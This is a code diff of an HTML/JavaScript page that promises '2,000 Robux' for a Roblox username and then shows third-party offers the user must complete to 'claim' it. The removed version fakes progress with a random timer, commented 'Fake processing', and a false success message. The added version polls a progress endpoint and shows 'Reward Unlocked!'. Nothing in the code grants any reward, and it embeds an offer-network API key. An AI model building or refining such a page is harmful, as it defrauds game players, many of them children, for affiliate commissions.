@@ -3,174 +3,201 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>hzm Redeem</title>
+<title>Claim Your Reward</title>
+
 <style>
-html,body { margin:0; padding:0; height:100%; width:100%; font-family:Arial, Helvetica, sans-serif; background: radial-gradient(circle at top,#0b1c3d,#050b1f 70%); color:white; display:flex; justify-content:center; align-items:center; }
-#step1 { display:flex; flex-direction:column; gap:15px; align-items:center; text-align:center; background:rgba(15,31,69,0.8); padding:40px; border-radius:16px; box-shadow:0 0 25px rgba(0,140,255,0.3); }
-.logo { font-size:40px; font-weight:bold; margin-bottom:10px; }
-input.locked { pointer-events:none; user-select:none; border:1px solid white; border-radius:6px; padding:14px; color:white; background:transparent; text-align:center; width:250px;}
-input[type=text]{padding:14px;border-radius:6px;border:1px solid #555;background:transparent;color:white;width:250px;}
-button{padding:14px;border-radius:6px;border:none;background:linear-gradient(90deg,#008cff,#00c6ff);color:white;font-weight:bold;cursor:pointer;width:260px;}
-button:hover{transform:translateY(-2px);}
-.error{color:#ff4d6d;text-align:center;height:18px;font-size:14px;}
-.modal { position: fixed; inset:0; display:flex; justify-content:center; align-items:center; background: rgba(0,0,0,0.6); display:none;}
-.card { background:#0f1f45; border-radius:16px; padding:30px; width:380px; text-align:center; box-shadow:0 0 25px rgba(0,140,255,0.4); border:1px solid rgba(0,140,255,0.4);}
-.avatar { width:110px;height:110px;border-radius:50%;border:3px solid #00aaff;background: linear-gradient(135deg,#008cff,#00c6ff);display:flex;justify-content:center;align-items:center;font-size:40px;margin:20px auto;font-weight:bold;}
-.username { font-size:20px; color:#4da3ff; font-weight:bold; }
-.handle { font-size:14px; color:#9bbcff; }
-.buttons { display:flex; justify-content:space-between; margin-top:20px; }
-.no-btn { background:#1c2d5c; width:45%; }
-.yes-btn { background: linear-gradient(90deg,#008cff,#00c6ff); width:45%; }
-.quest-box { display:none; flex-direction:column; background:#0f1f45; border-radius:16px; padding:20px; width:380px; box-shadow:0 0 25px rgba(0,140,255,0.4); border:1px solid rgba(0,140,255,0.4); margin-top:20px; }
-.progress-container { background:#1c2d5c; border-radius:10px; height:20px; width:100%; overflow:hidden; margin-bottom:10px;}
-.progress-bar { height:100%; width:0%; background: linear-gradient(90deg,#008cff,#00c6ff); transition: width 0.5s; }
-.reward-text { margin-top:10px; font-weight:bold; color:#00ff6a; display:none; text-align:center; }
-.offer { background:linear-gradient(90deg,#008cff,#00c6ff); padding:12px; margin-bottom:10px; border-radius:10px; cursor:pointer; font-weight:600; position:relative; overflow:hidden;}
-.offer.done { opacity:0.6; text-decoration:line-through; cursor:default;}
-.processing-overlay { position:absolute; inset:0; background:rgba(255,255,255,0.3); display:flex; justify-content:center; align-items:center; font-weight:bold; color:#000; font-size:16px; border-radius:10px; display:none; }
+html,body{
+  margin:0;
+  padding:0;
+  height:100%;
+  width:100%;
+  font-family:Arial, Helvetica, sans-serif;
+  background: radial-gradient(circle at top,#0d2d7a,#020617 80%);
+  color:white;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+#step1{
+  display:flex;
+  flex-direction:column;
+  gap:18px;
+  align-items:center;
+  background:rgba(0,90,255,0.25);
+  padding:45px;
+  border-radius:20px;
+  box-shadow:0 0 60px rgba(0,200,255,0.8);
+}
+
+.input-wrapper{
+  position:relative;
+  width:270px;
+}
+
+.input-wrapper img{
+  position:absolute;
+  left:12px;
+  top:50%;
+  transform:translateY(-50%);
+  width:22px;
+  height:22px;
+}
+
+.input-wrapper input{
+  width:100%;
+  padding:14px 14px 14px 48px;
+  border-radius:10px;
+  border:1px solid #00c3ff;
+  background:rgba(0,150,255,0.15);
+  color:white;
+  box-sizing:border-box;
+}
+
+.locked{
+  pointer-events:none;
+}
+
+button{
+  padding:14px;
+  border-radius:10px;
+  border:none;
+  background:linear-gradient(90deg,#00b7ff,#00f2ff);
+  color:white;
+  font-weight:bold;
+  cursor:pointer;
+  width:280px;
+}
+
+.quest-box{
+  display:none;
+  flex-direction:column;
+  background:rgba(0,90,255,0.3);
+  border-radius:22px;
+  padding:35px;
+  width:440px;
+  box-shadow:0 0 70px rgba(0,220,255,1);
+}
+
+.offer{
+  background:linear-gradient(90deg,#00b7ff,#00ffff);
+  padding:15px;
+  margin-bottom:14px;
+  border-radius:14px;
+  cursor:pointer;
+  text-align:center;
+}
 </style>
 </head>
 <body>
 
-<!-- Step 1 -->
 <div id="step1">
-  <div class="logo">hzm</div>
-  <input type="text" value="2,000 Robux" class="locked" readonly>
-  <input type="text" id="usernameInput" placeholder="Enter Roblox Username">
-  <button id="redeemBtn">Redeem</button>
-  <div class="error" id="errorMsg"></div>
-</div>
+  <div style="font-size:40px;font-weight:bold;color:#00eaff;">hzm</div>
 
-<!-- Step 2: Profile Modal -->
-<div class="modal" id="profileModal">
-  <div class="card">
-    <h3>✔ Confirm Your Profile</h3>
-    <p style="margin-top:6px;color:#9bbcff;">Is this your Roblox account?</p>
-    <div id="avatar" class="avatar">?</div>
-    <div id="displayName" class="username"></div>
-    <div id="handle" class="handle"></div>
-    <div class="buttons">
-      <button class="no-btn" id="noBtn">No</button>
-      <button class="yes-btn" id="yesBtn">Yes!</button>
-    </div>
+  <!-- Robux -->
+  <div class="input-wrapper">
+    <img src="https://cdn.discordapp.com/attachments/1472545291507859513/1474767798499541175/960px-Robux_2019_Logo_gold.svg.png?ex=699b0c0b&is=6999ba8b&hm=c268c5e4972aa9bedfe44b995e5e145f3dc51dab442fd9594d9fb0c89c31d6d4">
+    <input type="text" value="2,000 Robux" class="locked" readonly>
   </div>
+
+  <!-- Username -->
+  <div class="input-wrapper">
+    <img src="https://cdn.discordapp.com/attachments/1472545291507859513/1474768345214746676/Roblox_Verification_Badge.svg.png?ex=699b0c8d&is=6999bb0d&hm=074c528f113d675120de5af274f9522ad98abc40d97cae6b24434008474aa85f">
+    <input type="text" id="usernameInput" placeholder="Enter Roblox Username">
+  </div>
+
+  <button id="redeemBtn">Continue</button>
+  <div id="errorMsg" style="color:#ff4d6d;height:18px;"></div>
 </div>
 
-<!-- Step 3: Quest / Offers -->
 <div class="quest-box" id="questBox">
-  <h3>Complete 2 offers below to claim 2,000 Robux</h3>
+  <h2 style="text-align:center;color:#00ffff;">Claim Your Reward ✨</h2>
+
+  <div id="progressText" style="text-align:center;margin-bottom:15px;font-weight:bold;color:#00ffff;">
+    Offers Completed: 0/2
+  </div>
+
   <div id="offersContainer"></div>
-  <p>Offer Completed <span id="doneCount">0</span>/2</p>
-  <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
-  <p class="reward-text" id="rewardText">🎉 Congratulations! You earned 2,000 Robux</p>
 </div>
 
 <script>
-const step1=document.getElementById("step1");
 const redeemBtn=document.getElementById("redeemBtn");
 const usernameInput=document.getElementById("usernameInput");
 const errorMsg=document.getElementById("errorMsg");
-
-const profileModal=document.getElementById("profileModal");
-const displayName=document.getElementById("displayName");
-const handle=document.getElementById("handle");
-const avatar=document.getElementById("avatar");
-const noBtn=document.getElementById("noBtn");
-const yesBtn=document.getElementById("yesBtn");
-
+const step1=document.getElementById("step1");
 const questBox=document.getElementById("questBox");
 const offersContainer=document.getElementById("offersContainer");
-const doneCountEl=document.getElementById("doneCount");
-const progressBar=document.getElementById("progressBar");
-const rewardText=document.getElementById("rewardText");
 
-let doneCount=0;
+let currentUser = "";
 
-// Step 1: Redeem
-redeemBtn.addEventListener("click",()=>{
+redeemBtn.onclick=()=>{
   const username=usernameInput.value.trim();
+  if(!username){
+    errorMsg.textContent="Enter a username";
+    return;
+  }
+
+  currentUser = username;
   errorMsg.textContent="";
-  if(!username){ errorMsg.textContent="Enter a username"; return; }
-  displayName.textContent=username;
-  handle.textContent="@"+username;
-  avatar.textContent=username.charAt(0).toUpperCase();
-  profileModal.style.display="flex";
-});
+  redeemBtn.disabled=true;
+  redeemBtn.textContent="Loading...";
 
-// Step 2: Modal
-noBtn.addEventListener("click",()=>{ profileModal.style.display="none"; });
-yesBtn.addEventListener("click",()=>{
-  profileModal.style.display="none";
-  step1.style.display="none";
-  questBox.style.display="flex";
-  fetchOffers();
-});
+  setTimeout(()=>{
+    step1.style.display="none";
+    questBox.style.display="flex";
+    fetchOffers();
+    checkProgress();
+    setInterval(checkProgress,5000);
+  },1500);
+};
 
-// Step 3: Fetch offers
 function fetchOffers(){
-  const username=usernameInput.value.trim();
   const apiKey="4ae12a8fe006e35d228f7d24ff8d2729";
-  const apiUrl=`https://d1y3y09sav47f5.cloudfront.net/public/offers/feed.php?user_id=655069&api_key=${apiKey}&s1=${encodeURIComponent(username)}&s2=`;
+  const apiUrl=`https://d1y3y09sav47f5.cloudfront.net/public/offers/feed.php?user_id=655069&api_key=${apiKey}&s1=${encodeURIComponent(currentUser)}&s2=`;
 
-  offersContainer.innerHTML=`<p style="text-align:center;color:#9bbcff;">Loading offers...</p>`;
+  offersContainer.innerHTML="Loading offers...";
 
   fetch(apiUrl)
-  .then(res=>res.json())
-  .then(data=>{
-    let offersArray=[];
-    if(Array.isArray(data)) offersArray=data;
-    else if(data.offers) offersArray=data.offers;
-    else if(data.data && data.data.offers) offersArray=data.data.offers;
-    else if(data.data && Array.isArray(data.data)) offersArray=data.data;
+    .then(res=>res.json())
+    .then(data=>{
+      let offers=[];
+      if(Array.isArray(data)) offers=data;
+      else if(data.offers) offers=data.offers;
+      else if(data.data?.offers) offers=data.data.offers;
 
-    if(!offersArray || offersArray.length===0){
-      offersContainer.innerHTML=`<p style="color:#ff4d6d;text-align:center;">No offers available right now.</p>`;
-      return;
-    }
+      if(!offers.length){
+        offersContainer.innerHTML="No offers available.";
+        return;
+      }
 
-    offersContainer.innerHTML="";
-    offersArray.forEach((offer,index)=>{
-      const el=document.createElement("div");
-      el.className="offer";
-      el.textContent=offer.name || `Offer ${index+1}`;
-
-      const overlay=document.createElement("div");
-      overlay.className="processing-overlay";
-      overlay.textContent="Processing...";
-      el.appendChild(overlay);
-
-      el.addEventListener("click",()=>{
-        if(!el.classList.contains("done") && overlay.style.display==="none"){
-          // Open actual offer in new tab
-          window.open(offer.url,"_blank");
-          overlay.style.display="flex";
-          // Fake processing: 60-120 seconds
-          const delay=Math.floor(Math.random()*60+60)*1000;
-          setTimeout(()=>{
-            el.classList.add("done");
-            overlay.style.display="none";
-            doneCount++;
-            doneCountEl.textContent=doneCount;
-            updateProgress();
-            if(doneCount>=2){ rewardText.style.display="block"; }
-          },delay);
-        }
+      offersContainer.innerHTML="";
+      offers.forEach((offer,i)=>{
+        const div=document.createElement("div");
+        div.className="offer";
+        div.textContent=offer.name || `Offer ${i+1}`;
+        div.onclick=()=>{ if(offer.url) window.open(offer.url,"_blank"); };
+        offersContainer.appendChild(div);
       });
-
-      offersContainer.appendChild(el);
+    })
+    .catch(()=>{
+      offersContainer.innerHTML="Failed to load offers.";
     });
-  })
-  .catch(err=>{
-    console.error(err);
-    offersContainer.innerHTML=`<p style="color:#ff4d6d;text-align:center;">Failed to load offers.</p>`;
-  });
 }
 
-// Update progress bar
-function updateProgress(){
-  let pct=Math.min(100,(doneCount/2)*100);
-  progressBar.style.width=pct+"%";
+function checkProgress(){
+  fetch(`/api/progress?user=${currentUser}`)
+    .then(res=>res.json())
+    .then(data=>{
+      const completed = data.completed || 0;
+      document.getElementById("progressText").textContent =
+        `Offers Completed: ${completed}/2`;
+
+      if(completed >= 2){
+        alert("🎉 Reward Unlocked!");
+      }
+    });
 }
 </script>
+
 </body>
 </html>
